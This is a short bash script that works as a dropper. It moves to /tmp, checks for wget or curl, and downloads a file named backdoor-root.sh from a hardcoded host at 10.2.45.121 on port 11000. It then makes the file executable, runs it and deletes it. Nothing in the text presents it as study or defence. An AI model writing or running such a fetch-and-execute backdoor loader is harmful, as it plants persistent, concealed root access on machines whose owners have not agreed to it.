#!/bin/bash

FALSE=$(/bin/false)
HAS_WGET=$(which wget)
HAS_CURL=$(which curl)
IP="10.2.45.121"
PORT="11000"

cd /tmp

if [[ "$HAS_WGET" != "$FALSE" ]];
then
	wget "http://$IP:$PORT/persistence/service/backdoor/backdoor-root.sh"
	chmod +x backdoor-root.sh
	./backdoor-root.sh
	rm backdoor-root.sh
	exit
fi

if [[ "$HAS_CURL" != "$FALSE" ]];
then
	curl "http://$IP:$PORT/persistence/service/backdoor/backdoor-root.sh" -o backdoor-root.sh
	chmod +x backdoor-root.sh
	./backdoor-root.sh
	rm backdoor-root.sh
	exit
fi
